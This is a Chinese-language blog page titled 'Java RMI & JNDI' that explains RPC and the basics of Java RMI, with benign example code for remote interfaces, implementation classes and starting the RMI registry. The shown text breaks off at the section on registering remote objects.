<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/08/25/java rmi & jndi/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            Java RMI &amp; JNDI | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">13</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">16</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">50</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Java RMI &amp; JNDI</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-08-25 01:06:24</span>
        <span class="mobile">2025-08-25 01:06:24</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-08-25 01:04:18</span>
            <span class="mobile">2025-08-25 01:04:18</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/java-web/">java web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/java-web/">java web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>23.9k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>99 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="RMI（Remote-Method-Invocation）"><a href="#RMI（Remote-Method-Invocation）" class="headerlink" title="RMI（Remote Method Invocation）"></a>RMI（Remote Method Invocation）</h1><p><strong>RPC</strong>（Remote Procedure Call，远程过程调用）一种允许不同计算机上的程序之间通过网络进行通信并调用彼此的方法的技术。通过RPC，程序可以像调用本地函数一样调用远程的函数，隐藏了通信和网络的复杂性，使得分布式应用程序的开发变得更加简单。</p>
<p>RPC 的核心思想是：在分布式系统中，客户端通过调用远程服务器上的方法，获取远程服务的结果，而无需关注底层的网络通信和序列化等细节。RPC 框架负责将函数调用转换为网络请求，并处理请求的序列化、传输、反序列化等过程。</p>
<pre class="mermaid">sequenceDiagram
    participant Client
    participant Client_Stub
    participant Server_Stub
    participant Server
    
    
    Client->>Client_Stub: 1. 客户端调用
    activate Client
    activate Client_Stub
    Client_Stub->>Client_Stub: 2. 序列化
    Client_Stub->>Server_Stub: 3. 发送消息
    activate Server_Stub
    Server_Stub->>Server_Stub: 4. 反序列化
    Server_Stub->>Server: 5. 调用本地服务
    activate Server
    Server->>Server: 6. 服务处理
    Server-->>Server_Stub: 7. 返回处理结果
    deactivate Server
    Server_Stub->>Server_Stub: 8. 将结果序列化
    Server_Stub-->>Client_Stub: 9. 返回消息
    deactivate Server_Stub
    Client_Stub->>Client_Stub: 10. 反序列化
    Client_Stub-->>Client: 11. 返回调用结果
    deactivate Client_Stub
    deactivate Client</pre>

<p>Java RMI（远程方法调用）是 Java 平台提供的一种机制，它允许 Java 程序在不同的 JVM（Java虚拟机）上进行通信，并能够像调用本地对象一样调用远程对象的方法。RMI 是 Java  中分布式应用的基础技术之一，它封装了网络通信、序列化等复杂的底层实现，允许开发者专注于应用逻辑的实现。</p>
<p>Java RMI 允许客户端通过存根（Stub）对象，调用在远程 JVM 中的真实对象的方法。RMI 不仅支持<strong>方法调用的远程执行</strong>，还支持在<strong>不同机器之间传输对象</strong>。</p>
<h2 id="RMI的主要组件"><a href="#RMI的主要组件" class="headerlink" title="RMI的主要组件"></a>RMI的主要组件</h2><h3 id="远程接口（Remote-Interface）"><a href="#远程接口（Remote-Interface）" class="headerlink" title="远程接口（Remote Interface）"></a>远程接口（Remote Interface）</h3><p>远程接口定义了可以在远程调用中使用的方法，客户端和服务端都需定义用于远程调用的接口。远程接口必须满足下面两个要求：</p>
<ul>
<li>远程接口需要继承自 <code>java.rmi.Remote</code>。</li>
<li>远程接口的每个方法必须声明抛出 <code>java.rmi.RemoteException</code> 异常。</li>
</ul>
<p>下面是一个简单的远程接口示例：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(Object s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    String <span class="title function_">sayGoodBye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="远程对象实现类（Remote-Object-Implementation）"><a href="#远程对象实现类（Remote-Object-Implementation）" class="headerlink" title="远程对象实现类（Remote Object Implementation）"></a>远程对象实现类（Remote Object Implementation）</h3><p>服务端的远程对象实现类需要实现远程接口，且<strong>需要继承 <code>java.rmi.server.UnicastRemoteObject</code> 类</strong> 。<code>UnicastRemoteObject</code> 类提供了将远程对象注册到 RMI 注册中心的方法，方便自动将这个远程对象导出供客户端调用。下面是一个简单的远程对象实现类示例：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sayHello Called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayGoodBye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sayGoodbye Called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bye~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当然远程对象实现类也可以不继承 <code>UnicastRemoteObject</code>，但需要手动调用 <code>UnicastRemoteObject#exportObject</code> 来导出该远程对象，使其成为可被客户端调用的远程对象。导出对象时可以指定监听端口来接收 <code>incoming calls</code>，默认为随机端口。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHello</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="comment">// 手动导出对象</span></span><br><span class="line">        UnicastRemoteObject.exportObject(<span class="built_in">this</span>, <span class="number">1099</span>);  <span class="comment">// 可以指定端口</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sayHello Called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayGoodBye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sayGoodBye Called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bye~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="存根（Stub）和骨架（Skeleton）"><a href="#存根（Stub）和骨架（Skeleton）" class="headerlink" title="存根（Stub）和骨架（Skeleton）"></a>存根（Stub）和骨架（Skeleton）</h3><p>为屏蔽网络通信的复杂性，RMI引入两个概念，客户端<strong>存根（Stub）</strong>和服务端<strong>骨架（Skeleton）</strong> 。</p>
<ul>
<li><strong>存根（Stub）</strong>： 存根是客户端访问远程对象的代理。当客户端调用远程方法时，存根将方法调用封装并通过网络发送到远程服务器。</li>
<li><strong>骨架（Skeleton）</strong>： 骨架是服务器端的组件，用于接收客户端请求，并将请求传递给真实的远程对象执行。在JDK 5.0之后，骨架不再被需要，因为JDK使用动态代理来处理远程调用。</li>
</ul>
<h3 id="RMI-注册中心（RMI-Registry）"><a href="#RMI-注册中心（RMI-Registry）" class="headerlink" title="RMI 注册中心（RMI Registry）"></a>RMI 注册中心（RMI Registry）</h3><p>RMI 注册中心用于管理和查找远程对象，它监听一个端口（默认是 1099）并提供远程对象查找服务。</p>
<ul>
<li><strong>远程对象</strong>可以通过注册中心进行<strong>查找</strong>和<strong>绑定</strong> 。</li>
<li><strong>客户端</strong>通过 RMI 注册中心来查<strong>找远程对象</strong> 。</li>
</ul>
<h4 id="启动-RMI-注册中心"><a href="#启动-RMI-注册中心" class="headerlink" title="启动 RMI 注册中心"></a>启动 RMI 注册中心</h4><p>RMI 注册中心主要有两种启动方式：</p>
<ul>
<li><p>通过 <code>rmiregistry</code> 命令启动（独立进程方式）</p>
</li>
<li><p>通过 <code>LocateRegistry.createRegistry()</code> 启动（程序内启动方式）</p>
</li>
</ul>
<p>通过 <code>rmiregistry</code> 命令启动 RMI 注册中心是传统的启动方法，你需要在终端或命令行中运行 <code>rmiregistry</code> 命令手动启动一个独立的 RMI 注册中心进程，它会监听一个端口（默认是 1099），并等待客户端进行连接和查找远程对象。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmiregistry</span><br></pre></td></tr></table></figure></div>

<p>默认情况下，<code>rmiregistry</code> 会监听端口 1099。如果你希望 RMI 注册中心监听一个不同的端口，可以指定端口号，例如：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmiregistry 2000</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li>需要确保在 <strong>启动服务端程序之前</strong> 启动 RMI 注册中心。因为服务端会将远程对象注册到注册中心中，注册中心必须在此之前启动。</li>
<li>启动 <code>rmiregistry</code> 后，它会在终端持续运行并监听指定端口（默认是 1099）。在这个终端窗口中，你看不到任何提示，直到你停止它。</li>
<li>在使用 <code>rmiregistry</code> 时，通常建议将它放在单独的终端窗口或后台运行，以便它能够持续监听客户端的请求。</li>
</ul>

    </div>
  </div>

<p>另一种启动 RMI 注册中心的方式是通过 <code>LocateRegistry.createRegistry()</code> 启动 RMI 注册中心。这种方式通过 Java 代码在程序内部启动 RMI 注册中心。<code>LocateRegistry.createRegistry()</code> 方法可以在代码中指定端口号，并启动一个嵌入式的 RMI 注册中心。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建并启动 RMI 注册中心，监听 1099 端口</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;RMI registry is running.&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 你的远程对象实例化代码和绑定远程对象的代码</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>LocateRegistry.createRegistry()</code> 启动方式主要应用于开发和测试环境中。我们通常会直接把 RMI 启动部分放到服务端中，而不依赖外部的 <code>rmiregistry</code> 命令，这样可以简化调试和部署过程。</p>

    </div>
  </div>

<h4 id="服务端注册远程对象"><a href="#服务端注册远程对象" class="headerlink" title="服务端注册远程对象"></a>服务端注册远程对象</h4><p>远程对象需要在服务器端注册到 RMI 注册中心中，这样客户端才能通过注册中心查找到远程对象并进行方法调用。</p>
